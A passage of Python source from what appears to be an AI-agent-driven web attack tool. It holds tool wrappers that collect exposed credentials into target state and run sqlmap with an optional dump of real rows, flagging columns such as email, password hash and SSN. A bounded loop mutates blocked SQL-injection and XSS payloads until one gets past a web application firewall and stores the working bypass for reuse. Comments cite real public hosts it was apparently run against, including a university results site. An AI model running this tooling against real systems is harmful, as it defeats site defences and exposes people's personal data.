
        # Save discovered credentials and secrets into target state
        creds = intel.get("credentials", []) if isinstance(intel, dict) else []
        secrets = intel.get("secrets", []) if isinstance(intel, dict) else []
        if creds and hasattr(target, "state") and isinstance(target.state, dict):
            if "credentials" not in target.state or not isinstance(target.state["credentials"], list):
                target.state["credentials"] = []
            for c in creds:
                if c not in target.state["credentials"]:
                    target.state["credentials"].append(c)
        if secrets and hasattr(target, "state") and isinstance(target.state, dict):
            if "secrets" not in target.state or not isinstance(target.state["secrets"], list):
                target.state["secrets"] = []
            for s in secrets:
                if s not in target.state["secrets"]:
                    target.state["secrets"].append(s)

        try:
            update_from_spider(
                target,
                endpoints=endpoints,
                js_routes=js_routes,
                parameters=parameters,
            )
            save_target(target)
        except Exception:
            pass  # structured memory is best-effort — never let it break the actual crawl result

        return {
            "url": url,
            "endpoints_found": len(endpoints),
            "js_routes_found": len(js_routes),
            "parameters_found": len(parameters),
            "credentials_exposed": creds[:20],
            "secrets_exposed": secrets[:20],
            "sample_endpoints": endpoints[:30],
            "forms_found": len(intel.get("forms", [])),
            "parameters": parameters[:20],
            "crashed": bool(isinstance(res, dict) and res.get("crashed")),
            "tool_error": res.get("error") if isinstance(res, dict) else None
        }
    except Exception as e:
        return {"url": url, "error": f"Spider error: {e}"}


def _execute_katana(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """
    Targeted crawl via ProjectDiscovery's katana — a purpose-built, fast Go
    crawler (JS-aware endpoint discovery, form/field extraction) that
    complements the built-in Spider module rather than replacing it: Spider
    is Hellhound's own crawler with deep intel extraction (credentials,
    secrets, JS orphan params) wired straight into investigation memory;
    katana is the researcher's preferred tool for FAST, EFFICIENT crawling
    on a specific scope when they want katana specifically rather than
    Spider's own slower, deeper pass. Use this when the researcher names
    katana directly, or when Spider already ran and a quicker, narrower
    pass is what's needed. Discovered endpoints feed the same
    target.state["endpoints"]/js_routes bucket Spider uses, so later tools
    (content_discovery, js_static_analysis, etc.) see the combined result
    either way.
    """
    url = args.get("url") or target.name
    if not url.startswith(("http://", "https://")):
        url = f"https://{url}"
    depth = args.get("depth", 2)
    try:
        depth = max(1, min(int(depth), 5))
    except (TypeError, ValueError):
        depth = 2
    js_crawl = bool(args.get("js_crawl", True))
    known_files = args.get("known_files")  # e.g. "robotstxt,sitemapxml" — katana's own flag values

    auto_install = bool(load_config().get("auto_install_missing_tools", False))
    check = ensure_tool("katana", emit=emit, auto_install=auto_install)
    if not check["available"]:
        if emit and hasattr(emit, "warn"):
            emit.warn(check["message"])
        return {
            "error": "katana not installed",
            "message": check["message"],
            "hint": "pdtm -i katana",
            "note": "The built-in 'spider' tool still works without katana — use that instead if katana can't be installed right now.",
        }

    binary = get_binary_path("katana") or "katana"
    cmd = [binary, "-u", url, "-d", str(depth), "-silent", "-jsonl", "-timeout", "15", "-no-color"]
    if js_crawl:
        cmd.append("-jc")
    if known_files:
        cmd.extend(["-kf", str(known_files)])

    auth_opts = _target_auth_options(target)
    auth_headers = auth_opts.get("auth_headers") or {}
    auth_cookies = auth_opts.get("auth_cookies") or {}
    for hk, hv in auth_headers.items():
        cmd.extend(["-H", f"{hk}: {hv}"])
    if auth_cookies:
        cookie_str = "; ".join(f"{k}={v}" for k, v in auth_cookies.items())
        cmd.extend(["-H", f"Cookie: {cookie_str}"])

    try:
        proc = _run_cmd_with_heartbeat(cmd, timeout=90, emit=emit, label=f"katana crawl ({url})")
    except subprocess.TimeoutExpired:
        return {"url": url, "error": "katana timed out after 90s — try a lower depth."}
    except Exception as e:
        return {"url": url, "error": f"katana execution failed: {e}"}

    endpoints: List[str] = []
    js_routes: List[str] = []
    forms_found = 0
    for line in (proc.stdout or "").splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            rec = json.loads(line)
        except Exception:
            # Not every katana build/flag-set emits valid JSON per line —
            # fall back to treating the raw line as a bare URL rather than
            # silently dropping the whole crawl's output.
            if line.startswith(("http://", "https://")):
                endpoints.append(line)
            continue
        req = rec.get("request") if isinstance(rec, dict) else None
        ep = (req or {}).get("endpoint") or (rec.get("url") if isinstance(rec, dict) else None)
        if not ep:
            continue
        ep = str(ep).strip()
        if ep.lower().endswith(".js") or ".js?" in ep.lower():
            if ep not in js_routes:
                js_routes.append(ep)
        elif ep not in endpoints:
            endpoints.append(ep)
        if isinstance(rec, dict) and rec.get("response", {}).get("forms"):
            forms_found += len(rec["response"]["forms"])

    try:
        update_from_spider(target, endpoints=endpoints, js_routes=js_routes)
        save_target(target)
    except Exception:
        pass

    return {
        "url": url,
        "depth": depth,
        "endpoints_found": len(endpoints),
        "js_routes_found": len(js_routes),
        "sample_endpoints": endpoints[:50],
        "js_routes": js_routes[:30],
        "forms_found": forms_found,
        "stderr_tail": (proc.stderr or "").strip()[-500:] if proc.returncode != 0 else None,
    }


_LAB_TLDS = (".thm", ".htb", ".local", ".test", ".lan", ".internal")


def _is_likely_lab_target(target: Target) -> bool:
    """
    Best-effort heuristic: is this host almost certainly a CTF/lab/internal
    engagement rather than a real public bug-bounty/pentest target? Used to
    decide whether privilege-escalation-flavored actions (cron hijacking,
    sudo abuse, writing to root-owned paths) can proceed on the researcher's
    standing say-so for this session, or should pause and ask first — a
    private RFC1918/loopback/link-local IP or a known lab TLD (.thm/.htb/
    etc, TryHackMe/HackTheBox conventions) is overwhelmingly a VPN-routed
    lab box, never a real company's production asset. A real public host
    always falls through to "ask first" instead of guessing.
    """
    import ipaddress
    host = (target.host or target.name or "").strip().lower()
    if not host:
        return False
    host_no_port = host.split(":")[0].split("/")[0]
    if any(host_no_port.endswith(tld) for tld in _LAB_TLDS) or host_no_port in ("localhost",):
        return True
    try:
        ip = ipaddress.ip_address(host_no_port)
        return ip.is_private or ip.is_loopback or ip.is_link_local or ip.is_reserved
    except ValueError:
        return False


def _target_auth_options(target: Target) -> Dict[str, Any]:
    """
    Pulls this target's already-captured authenticated session (from a
    login flow, cookie_inspector, or an imported Burp/Caido history) into
    the `options` shape http_utils.apply_session_config() reads —
    auth_cookies / auth_headers. Shared by every rule-based recon module
    wrapper below (wafbuster, surface_auditor, cors_checker, graphql_probe,
    transport_auditor) so each of them tests WITH the live session instead
    of a bare unauthenticated requests.Session(), same auth source of
    truth every other request-sending tool (curl, httpx, run_terminal_command)
    already reads from. Returns {} (nothing to add) when no session has
    been captured yet — harmless no-op for a pre-auth target.
    """
    state = target.state if (target and isinstance(target.state, dict)) else {}
    out: Dict[str, Any] = {}
    cookies = state.get("cookies")
    session_cookie = state.get("session_cookie")
    if isinstance(cookies, dict) and cookies:
        out["auth_cookies"] = dict(cookies)
    elif session_cookie:
        out["auth_cookies"] = normalize_cookies(session_cookie)
    headers = state.get("headers")
    if isinstance(headers, dict) and headers:
        out["auth_headers"] = dict(headers)
    return out


def _effective_spider_intel(target: Target, explicit: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
    """
    CAUGHT IN THE WILD (www.mercadolibre.com): cors_checker/wafbuster/
    surface_auditor/graphql_probe all read ONLY target.state["spider_intel"]
    for the endpoint list to sweep -- and that key is written ONLY by the
    full 'spider' tool. When the researcher (or the model) uses 'katana'
    instead -- faster, and explicitly offered as spider's lighter-weight
    alternative -- or endpoints come from content_discovery/js_static_
    analysis/manual record, spider_intel stays empty and these checks
    silently degrade to "test ONE url" with no signal that anything was
    skipped. This merges in target.state["endpoints"] -- the canonical
    combined bucket every discovery tool (spider, katana, content_discovery,
    js_static_analysis) actually feeds -- regardless of which specific
    crawler produced them, so a CORS/WAF/surface/GraphQL sweep covers
    whatever the agent has actually found so far, not just spider's output.
    """
    intel = dict(explicit or target.state.get("spider_intel", {}) or {})
    known_eps = {
        (e.get("url") if isinstance(e, dict) else str(e))
        for e in (intel.get("endpoints") or [])
        if e
    }
    merged = list(intel.get("endpoints") or [])
    for ep in (target.state.get("endpoints") or []):
        ep_url = ep.get("url") if isinstance(ep, dict) else str(ep)
        if ep_url and ep_url not in known_eps:
            merged.append({"url": ep_url} if not isinstance(ep, dict) else ep)
            known_eps.add(ep_url)
    intel["endpoints"] = merged
    return intel


def _execute_wafbuster(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    from hellhound.core.engine import HellhoundEngine
    url = args.get("url") or target.name
    if not url.startswith(("http://", "https://")):
        url = f"https://{url}"

    # Was calling run_single() with no `options` kwarg at all — WAFbuster.py
    # (and every module like it) unconditionally calls
    # http_utils.apply_session_config(session, options) near the top of
    # run(), which crashed on options=None (AttributeError on the first
    # .get()), caught by the module's own broad except-and-log-nothing-
    # useful block. Net effect: wafbuster silently no-op'd on every call
    # through the chat box — confirmed independently while wiring auth
    # through here, not a hypothetical. Passing a real opts dict (even an
    # empty one) fixes that outright; it also now carries the captured
    # session same as the other four wrappers below.
    opts = {"spider_intel": _effective_spider_intel(target)}
    opts.update(_target_auth_options(target))
    engine = HellhoundEngine()
    try:
        res = engine.run_single("wafbuster", url, options=opts, emit=emit)
        return {
            "url": url,
            "result": res
        }
    except Exception as e:
        return {"url": url, "error": f"WAF check error: {e}"}


def _execute_surface_auditor(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    from hellhound.core.engine import HellhoundEngine
    url = args.get("url") or target.name
    if not url.startswith(("http://", "https://")):
        url = f"https://{url}"

    spider_intel = _effective_spider_intel(target, args.get("spider_intel"))
    opts = {"spider_intel": spider_intel}
    opts.update(_target_auth_options(target))
    engine = HellhoundEngine()
    try:
        res = engine.run_single("surface_auditor", url, options=opts, emit=emit)
        return {
            "url": url,
            "result": res
        }
    except Exception as e:
        return {"url": url, "error": f"Surface auditor error: {e}"}


def _execute_cors_checker(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    from hellhound.core.engine import HellhoundEngine
    url = args.get("url") or target.name
    if not url.startswith(("http://", "https://")):
        url = f"https://{url}"

    spider_intel = _effective_spider_intel(target, args.get("spider_intel"))
    opts = {"spider_intel": spider_intel}
    opts.update(_target_auth_options(target))
    engine = HellhoundEngine()
    try:
        res = engine.run_single("corsbuster", url, options=opts, emit=emit)
        _mirror_cors_evidence(res, target)
        return {
            "url": url,
            "result": res
        }
    except Exception as e:
        return {"url": url, "error": f"CORS check error: {e}"}


def _mirror_cors_evidence(res: Dict[str, Any], target: Target) -> None:
    """
    CORSbuster makes its own HTTP requests via a raw requests.Session(),
    bypassing _execute_curl/run_terminal_command entirely -- so its probes
    never reached target.state['curl_evidence_log'], and record_finding's
    evidence lookup (_lookup_curl_evidence, URL-substring match only) would
    instead silently attach whatever UNRELATED earlier curl happened to hit
    the same URL. That's worse than no evidence: a real finding ends up
    backed by a request/response that doesn't actually demonstrate it (e.g.
    a plain authenticated GET with no Origin header standing in as "proof"
    of an origin-reflection bypass). Mirroring each confirmed finding's own
    captured request/response here, timestamped at probe time, makes it the
    newest entry for that URL -- which _lookup_curl_evidence's recency-first
    match then picks correctly.
    """
    try:
        if not hasattr(target, "state") or not isinstance(target.state, dict):
            return
        findings = ((res or {}).get("intel") or {}).get("cors_vulnerabilities") or []
        if not findings:
            return
        evidence_log = target.state.setdefault("curl_evidence_log", [])
        for f in findings:
            url = f.get("url")
            payload = f.get("payload")
            if not url or not payload:
                continue
            status = f.get("status_code")
            resp_headers = f.get("response_headers") or {}
            method = (f.get("repro_data") or {}).get("method", "OPTIONS")
            status_line = f"HTTP/1.1 {status} " + ("OK" if status and status < 400 else "") if status else "(no response captured)"
            headers_block = "\n".join(f"{k}: {v}" for k, v in resp_headers.items())
            raw_evidence = (
                f"$ curl -s -X {method} \"{url}\" -H \"Origin: {payload}\"\n\n"
                f"{status_line}\n{headers_block}"
            )
            evidence_log.append({
                "url": url,
                "method": method,
                "origin_sent": payload,
                "status": status,
                "raw": raw_evidence,
                "ts": datetime.now(timezone.utc).isoformat(),
                "source": "cors_checker",
            })
        if len(evidence_log) > 40:
            del evidence_log[: len(evidence_log) - 40]
    except Exception:
        pass


def _execute_graphql_probe(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    from hellhound.core.engine import HellhoundEngine
    url = args.get("url") or target.name
    if not url.startswith(("http://", "https://")):
        url = f"https://{url}"

    spider_intel = _effective_spider_intel(target, args.get("spider_intel"))
    opts = {"spider_intel": spider_intel}
    opts.update(_target_auth_options(target))
    engine = HellhoundEngine()
    try:
        res = engine.run_single("graphql", url, options=opts, emit=emit)
        return {
            "url": url,
            "result": res
        }
    except Exception as e:
        return {"url": url, "error": f"GraphQL check error: {e}"}


def _execute_sqlmap_scan(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """
    Confirm SQL injection on a SPECIFIC url/parameter using sqlmap, instead
    of hand-crafting payloads one at a time. Deliberately scoped tight:
    by default this only confirms injectability and, if injectable, lists
    database NAMES (--dbs/--current-db/--banner) as the impact proof —
    naming a real database is already "I can extract data," which is
    enough to back a finding without this tool also pulling row-level
    data. --batch keeps sqlmap from blocking on an interactive
    prompt, and risk/level are capped to the tool's own sane defaults
    (not sqlmap's noisiest settings) unless the caller raises them.

    Opt-in `dump_sample_rows` (default off, hard-capped at 5) goes one
    step further: a SMALL sample dump (--dump --limit 0-N), not a full
    extraction. A mass-PII-leak report backed by 4 real rows (names,
    emails, hashes — whatever's actually in the table) is categorically
    stronger evidence than "a database named X exists," and most
    programs pay more for it. Still a proof-of-impact slice, not row-level
    exfiltration — N stays small on purpose. If the caller names a
    table/db (`table`/`db`), the dump targets that one; otherwise sqlmap
    dumps whatever table it lands on by default, which is fine for
    confirming impact but may not be the most interesting table.

    Reuses whatever session this target already has captured (same
    target.state cookies/headers every other request-sending tool reads
    from) so it doesn't need a fresh login replayed into it separately.
    """
    url = (args.get("url") or "").strip()
    if not url:
        return {"error": "No url specified — sqlmap needs one specific endpoint (and, ideally, the parameter) to target, not a whole site."}
    if not url.startswith(("http://", "https://")):
        url = f"https://{url}"

    auto_install = bool(load_config().get("auto_install_missing_tools", False))
    check = ensure_tool("sqlmap", emit=emit, auto_install=auto_install)
    if not check["available"]:
        if emit and hasattr(emit, "warn"):
            emit.warn(check["message"])
        return {"error": "sqlmap not installed", "message": check["message"], "hint": install_hint("sqlmap")}

    binary = get_binary_path("sqlmap") or "sqlmap"

    # Clamp rather than trust the caller blindly — this tool's whole point
    # is confirmation with low noise, not sqlmap's most aggressive mode.
    level = max(1, min(int(args.get("level", 1) or 1), 3))
    risk = max(1, min(int(args.get("risk", 1) or 1), 2))

    cmd = [binary, "-u", url, "--batch", "--level", str(level), "--risk", str(risk)]

    data = args.get("data") or args.get("body")
    if data:
        cmd += ["--data", str(data)]
    param = args.get("param") or args.get("parameter")
    if param:
        cmd += ["-p", str(param)]

    state = target.state if (target and isinstance(target.state, dict)) else {}
    session_cookie = state.get("session_cookie") or ""
    if not session_cookie and isinstance(state.get("cookies"), dict) and state["cookies"]:
        session_cookie = "; ".join(f"{k}={v}" for k, v in state["cookies"].items())
    if session_cookie:
        cmd += ["--cookie", str(session_cookie)]
    headers = state.get("headers") if isinstance(state.get("headers"), dict) else {}
    for hk, hv in headers.items():
        if hk.lower() == "cookie":
            continue
        cmd += ["-H", f"{hk}: {hv}"]

    # Database NAME enumeration is the default proof-of-impact step; the
    # caller can turn it off for a pure injectability check with nothing
    # further. Table/row-level dumping is intentionally not wired up here.
    if args.get("list_databases", True):
        cmd += ["--dbs"]
    if args.get("current_db"):
        cmd += ["--current-db"]
    if args.get("is_dba"):
        cmd += ["--is-dba"]

    dump_sample = False
    sample_limit = 0
    if args.get("dump_sample_rows"):
        dump_sample = True
        try:
            sample_limit = int(args.get("dump_sample_rows"))
        except (TypeError, ValueError):
            sample_limit = 4
        # Hard cap regardless of what the caller asked for -- this is a
        # proof-of-impact sample, not a row-dump tool. 1 is floored so
        # "dump_sample_rows: true" (no number) still does something.
        sample_limit = max(1, min(sample_limit, 5))
        db_name = args.get("db") or args.get("database")
        table_name = args.get("table")
        if db_name:
            cmd += ["-D", str(db_name)]
        if table_name:
            cmd += ["-T", str(table_name)]
        cmd += ["--dump", "--limit", f"0-{sample_limit - 1}"]

    # CAUGHT IN THE WILD (result.gujaratuniversity.ac.in): sqlmap had
    # already confirmed injectability AND enumerated database names before
    # hitting the wall clock -- especially likely once --dump is added on
    # top of --dbs, since dumping needs real extra time beyond a bare
    # confirm. The old flat 240s applied even to a dump_sample_rows call
    # that structurally needs longer. Let the caller raise it (e.g. for a
    # sample dump), default higher than before, capped so this tool stays
    # "confirm + light proof," never an hours-long unattended run.
    default_timeout = 360 if dump_sample else 240
    try:
        timeout_s = max(60, min(int(args.get("timeout", default_timeout) or default_timeout), 600))
    except (TypeError, ValueError):
        timeout_s = default_timeout

    timed_out = False
    try:
        proc = _run_cmd_with_heartbeat(cmd, timeout=timeout_s, emit=emit, label=f"sqlmap ({url})")
        output = (proc.stdout or "") + "\n" + (proc.stderr or "")
    except subprocess.TimeoutExpired as e:
        # Salvage whatever sqlmap had already confirmed before the kill
        # (see the matching fix in _run_cmd_with_heartbeat) instead of
        # discarding it and forcing a full, noisy re-run from scratch.
        timed_out = True
        output = (getattr(e, "stdout", None) or getattr(e, "output", None) or "") + "\n" + (getattr(e, "stderr", None) or "")
        if not output.strip():
            return {"url": url, "error": f"sqlmap timed out after {timeout_s}s with no output captured yet — try a narrower level/risk, a specific --param, or pass a higher 'timeout'."}
    except Exception as e:
        return {"url": url, "error": f"sqlmap execution failed: {e}"}

    injectable = bool(re.search(r"is vulnerable|injection point\(s\)|sqlmap identified the following injection point", output, re.I))
    dbms_match = re.search(r"back-end DBMS:\s*(.+)", output)
    databases: List[str] = []
    db_section = re.search(r"available databases \[\d+\]:\s*\n((?:\[\*\].+\n?)+)", output)
    if db_section:
        databases = [line.strip().lstrip("[*]").strip() for line in db_section.group(1).splitlines() if line.strip()]
    current_db_match = re.search(r"current database:\s*'?([^'\n]+)'?", output, re.I)
    is_dba_match = re.search(r"current user is DBA:\s*(True|False)", output, re.I)

    tail_lines = [ln for ln in output.splitlines() if ln.strip()][-40:]

    result = {
        "url": url,
        "command": " ".join(cmd),
        "injectable": injectable,
        "dbms": dbms_match.group(1).strip() if dbms_match else None,
        "databases": databases,
        "current_db": current_db_match.group(1).strip() if current_db_match else None,
        "is_dba": (is_dba_match.group(1).lower() == "true") if is_dba_match else None,
        "raw_tail": "\n".join(tail_lines),
    }
    if timed_out:
        result["timed_out"] = True
        result["note"] = (
            f"sqlmap hit the {timeout_s}s wall clock before finishing, but partial output was captured and "
            f"parsed above (injectable/dbms/databases reflect whatever sqlmap had already confirmed at that "
            f"point, if anything) -- don't assume a blank field means it wasn't found, it may just not have "
            f"gotten there yet. Re-running from scratch isn't usually necessary; if dump_sample_rows was the "
            f"goal and it's not in the result below, re-call with a higher 'timeout' or narrower level/risk "
            f"rather than repeating the same call."
        )

    if dump_sample:
        # sqlmap's dump table render looks like:
        #   Database: wordpress
        #   Table: wp_users
        #   [4 entries]
        #   +----+------------+-------------------------+
        #   | id | user_login | user_email               |
        #   +----+------------+-------------------------+
        #   | 1  | elyana     | elyana@example.com       |
        #   +----+------------+-------------------------+
        dump_table_match = re.search(r"Database:\s*(.+?)\nTable:\s*(.+?)\n\[\d+ entries?\]\n(\+[-+]+\+\n.*?\+[-+]+\+)", output, re.S)
        result["dump_sample_requested"] = sample_limit
        if dump_table_match:
            result["dumped"] = True
            result["dumped_db"] = dump_table_match.group(1).strip()
            result["dumped_table"] = dump_table_match.group(2).strip()
            result["dumped_sample"] = dump_table_match.group(3).strip()
            # Cheap PII signal off the dumped column header row, so the
            # caller doesn't have to re-parse the ASCII table itself to
            # judge whether this is worth reporting as a mass-PII leak.
            header_match = re.search(r"\+[-+]+\+\n\|(.+?)\|\n\+[-+]+\+", dump_table_match.group(3))
            pii_cols = []
            if header_match:
                cols = [c.strip().lower() for c in header_match.group(1).split("|")]
                pii_markers = ("email", "mail", "pass", "hash", "phone", "ssn", "address", "dob", "name", "token", "secret")
                pii_cols = [c for c in cols if any(m in c for m in pii_markers)]
            result["dumped_columns_with_pii_signal"] = pii_cols
        else:
            result["dumped"] = False
            result["dump_note"] = "--dump ran but no table output was parsed from sqlmap's output -- check raw_tail (sqlmap may have needed an interactive choice despite --batch, found an empty table, or the table/db name didn't exist)."

    return result


def _execute_wpscan_scan(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """
    Runs wpscan against a confirmed WordPress target. Exists mainly to fix
    a real, observed failure mode of running wpscan ad hoc via
    run_terminal_command: an API token (WPScan's vulnerability database
    lookup) either got passed as an empty string (sqlmap-style '--api-token
    \"\"'), which wpscan flat-out rejects and aborts on, or was silently
    skipped with no mention back to the researcher that vuln-DB matching
    was running degraded. Neither is right — the fix is to actually LOOK
    for a configured token first and only fall back to keyless with a
    clear, structured note about what that costs, so the researcher (or
    the model) can supply one if they have it instead of a failed/guessed
    command.

    Token resolution order: explicit args.api_token -> target.state
    (already supplied once this engagement) -> the persistent
    tool_api_keys.wpscan config value (saved once via /apikey, reused on
    every future target automatically) -> keyless.
    """
    url = (args.get("url") or "").strip()
    if not url:
        return {"error": "wpscan_scan needs a 'url' (the WordPress site root, e.g. http://10.0.0.5/wordpress/)."}
    if not url.startswith(("http://", "https://")):
        url = f"http://{url}"

    auto_install = bool(load_config().get("auto_install_missing_tools", False))
    check = ensure_tool("wpscan", emit=emit, auto_install=auto_install)
    if not check["available"]:
        if emit and hasattr(emit, "warn"):
            emit.warn(check["message"])
        return {"error": "wpscan not installed", "message": check["message"], "hint": install_hint("wpscan")}

    binary = get_binary_path("wpscan") or "wpscan"

    state = target.state if (target and isinstance(target.state, dict)) else {}
    token = (
        str(args.get("api_token", "") or "").strip()
        or str(state.get("wpscan_api_token", "") or "").strip()
        or str((load_config().get("tool_api_keys") or {}).get("wpscan", "") or "").strip()
    )
    token_source = None
    if token:
        token_source = "argument" if args.get("api_token") else ("target session" if state.get("wpscan_api_token") else "saved config (/apikey)")
        # Remember it on this target so it doesn't need to be supplied again
        # for the rest of THIS engagement even if it only arrived via args.
        if isinstance(target.state, dict):
            target.state["wpscan_api_token"] = token

    enumerate_opt = str(args.get("enumerate", "vp,vt,u") or "vp,vt,u")
    cmd = [binary, "--url", url, "--enumerate", enumerate_opt, "--random-user-agent", "--no-update"]
    if token:
        cmd += ["--api-token", token]

    try:
        proc = _run_cmd_with_heartbeat(cmd, timeout=180, emit=emit, label=f"wpscan ({url})")
        output = (proc.stdout or "") + "\n" + (proc.stderr or "")
    except subprocess.TimeoutExpired:
        return {"url": url, "error": "wpscan timed out after 180 seconds."}
    except Exception as e:
        return {"url": url, "error": f"wpscan execution failed: {e}"}

    vulns = re.findall(r"\[!\]\s+Title:\s*(.+)", output)
    version_match = re.search(r"WordPress version\s+([\d.]+)\s+identified", output)

    result = {
        "url": url,
        "command": " ".join(cmd if not token else cmd[:-1] + ["<redacted>"]),
        "ran_with_api_token": bool(token),
        "wordpress_version": version_match.group(1) if version_match else None,
        "vulnerabilities_found": vulns,
        "raw_tail": "\n".join([ln for ln in output.splitlines() if ln.strip()][-60:]),
    }
    if not token:
        result["note"] = (
            "Ran KEYLESS — no WPScan API token configured anywhere (argument, this target's "
            "session, or saved config), so the vulnerability-database lookup for plugins/themes/"
            "core was skipped or limited; version/user/enum results above are still valid. If the "
            "researcher has a free WPScan API token, ask them for it and pass it as 'api_token' "
            "next time (it'll be remembered for the rest of this target's session), or save it "
            "permanently with /apikey wpscan <token> so every future target picks it up "
            "automatically without asking again."
        )
    else:
        result["api_token_source"] = token_source

    return result


# ──────────────────────────────────────────────────────────────────────────
# Adaptive WAF evasion: mutation-feedback loop
# ──────────────────────────────────────────────────────────────────────────
#
# WAFbuster's active_trigger() only ever sends 3 fixed, unmutated payloads
# to FINGERPRINT whether a WAF exists — it was never meant to, and doesn't,
# try to get a genuinely malicious payload PAST one. This is the other half:
# given a payload that already got blocked, try a bounded, ordered list of
# mutations and stop at the FIRST one that gets through, rather than firing
# every mutation at the target regardless (that would be exactly the
# "reach for a tool/noise randomly" behavior the rest of this file
# deliberately avoids). Each mutation is cheap and well-known, not a fuzzer —
# this is for the specific, common case of "my payload is right but a WAF
# in front of the app is eating it."

def _waf_mutations(payload: str, payload_type: str) -> List[Dict[str, str]]:
    import urllib.parse as _up

    muts: List[Dict[str, str]] = [{"name": "baseline (unmutated)", "value": payload}]

    # 1. Single URL-encoding of the whole payload.
    muts.append({"name": "url_encode_once", "value": _up.quote(payload, safe="")})
    # 2. Double URL-encoding — classic WAF bypass since many WAFs decode once.
    muts.append({"name": "url_encode_twice", "value": _up.quote(_up.quote(payload, safe=""), safe="")})
    # 3. Alternating case on every alphabetic character.
    muts.append({"name": "case_alternate", "value": "".join(
        c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(payload)
    )})
    # 4. Spaces -> URL-encoded tab (%09) — some regex-based WAFs key on a
    #    literal space between keywords and miss other whitespace chars.
    if " " in payload:
        muts.append({"name": "space_to_tab", "value": payload.replace(" ", "%09")})
        muts.append({"name": "space_to_newline", "value": payload.replace(" ", "%0a")})
    # 5. Trailing null-byte — some older/legacy WAF rule engines stop
    #    matching at %00 even though the backend parser doesn't.
    muts.append({"name": "trailing_null_byte", "value": payload + "%00"})

    if payload_type == "sqli" or re.search(r'\b(union|select|or|and)\b', payload, re.I):
        # 6. Inline SQL comments splitting keywords — bypasses WAFs doing a
        #    literal substring match on "UNION SELECT" etc.
        def _inline_comment_sqli(p: str) -> str:
            return re.sub(
                r'\b(union|select|from|where|and|or|insert|update|delete)\b',
                lambda m: m.group(1)[:len(m.group(1)) // 2] + "/**/" + m.group(1)[len(m.group(1)) // 2:],
                p, flags=re.I,
            )
        muts.append({"name": "sql_inline_comment_split", "value": _inline_comment_sqli(payload)})
        # 7. Keyword case-mix specifically on SQL keywords (UnIoN SeLeCt).
        def _mixed_case_sqli(p: str) -> str:
            return re.sub(
                r'\b(union|select|from|where|and|or|insert|update|delete)\b',
                lambda m: "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(m.group(1))),
                p, flags=re.I,
            )
        muts.append({"name": "sql_mixed_case_keywords", "value": _mixed_case_sqli(payload)})

    if payload_type == "xss" or re.search(r'<\s*script|on\w+\s*=', payload, re.I):
        # 8. HTML entity-encode angle brackets — browsers decode entities in
        #    attribute/text context; some WAFs only pattern-match raw '<'.
        muts.append({"name": "html_entity_angle_brackets", "value": payload.replace("<", "&lt;").replace(">", "&gt;")})
        # 9. Hex HTML entity encoding of angle brackets (a different
        #    encoding path than decimal entities — some filters miss it).
        muts.append({"name": "hex_html_entity_angle_brackets", "value": payload.replace("<", "&#x3C;").replace(">", "&#x3E;")})

    return muts


_WAF_BLOCK_PHRASES = (
    "blocked", "forbidden", "access denied", "request rejected", "security policy",
    "not acceptable", "attack detected", "malicious request", "waf", "firewall",
    "mod_security", "modsecurity", "incapsula", "cloudflare", "unauthorized activity",
    "your request has been blocked", "suspicious activity",
)


def _looks_waf_blocked(status_code: int, body: str) -> bool:
    if status_code in (403, 406, 429, 501):
        return True
    body_low = (body or "")[:2000].lower()
    return any(p in body_low for p in _WAF_BLOCK_PHRASES)


def _execute_waf_evasion_probe(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """
    Given a payload that already got blocked (by a WAF, not by the app's
    own logic — confirm that distinction yourself before reaching for this),
    try a bounded, ordered list of well-known encoding/case/whitespace
    mutations against the SAME endpoint and stop at the first one that gets
    through. Returns every attempt tried so the model can see exactly what
    was blocked and what wasn't, instead of silently picking one. This does
    NOT confirm the underlying vuln still fires with the mutated payload —
    that still needs its own confirmation step (reflected in response,
    sqlmap, OOB callback, etc.) per the non-determinism/false-positive
    discipline every other tool in this file follows.
    """
    url = (args.get("url") or "").strip()
    payload = args.get("payload")
    if not url or not payload:
        return {"error": "waf_evasion_probe requires both 'url' and the 'payload' that already got blocked."}
    param = (args.get("param") or "test").strip()
    method = (args.get("method") or "GET").upper()
    payload_type = (args.get("payload_type") or "generic").strip().lower()

    auth_opts = _target_auth_options(target)
    headers = {"User-Agent": "Hellhound/1.0"}
    headers.update(auth_opts.get("auth_headers", {}))
    cookies = auth_opts.get("auth_cookies", {})

    mutations = _waf_mutations(str(payload), payload_type)[:9]  # hard cap — bounded, not a fuzzer
    attempts = []
    winning = None

    for mut in mutations:
        try:
            if method == "GET":
                sep = "&" if "?" in url else "?"
                probe_url = f"{url}{sep}{param}={mut['value']}"
                r = _bounded_request(lambda: requests.get(probe_url, headers=headers, cookies=cookies, timeout=10, verify=False, allow_redirects=False))
            else:
                probe_url = url
                headers_post = dict(headers)
                headers_post.setdefault("Content-Type", "application/x-www-form-urlencoded")
                r = _bounded_request(lambda: requests.request(method, probe_url, headers=headers_post, cookies=cookies,
                                      data=f"{param}={mut['value']}", timeout=10, verify=False, allow_redirects=False))
            blocked = _looks_waf_blocked(r.status_code, r.text)
            attempts.append({
                "mutation": mut["name"], "payload_sent": mut["value"],
                "status_code": r.status_code, "blocked": blocked,
            })
            if not blocked:
                winning = mut["name"]
                break
        except Exception as e:
            attempts.append({"mutation": mut["name"], "payload_sent": mut["value"], "error": str(e)})

    # Immediate cross-target lesson, same reasoning as dismiss_finding's and
    # record_finding's: a WAF bypass (or a confirmed dead end) is exactly
    # the kind of generalizable thing the NEXT target with a similar stack
    # should start with instead of re-discovering it from scratch — don't
    # wait on the end-of-session LLM mining pass for this.
    try:
        tech_sig = (list(target.state.get("technologies") or []) if hasattr(target, "state") and isinstance(target.state, dict) else []) + [payload_type]
        if winning:
            add_lesson(
                technique=f"WAF-evasion mutation '{winning}' got a {payload_type} payload past a blocking WAF/filter",
                outcome="worked",
                tech_signature=tech_sig,
                note=f"Baseline payload was blocked; '{winning}' encoding/case mutation got a non-blocked response.",
                target_name=target.name if target else "",
            )
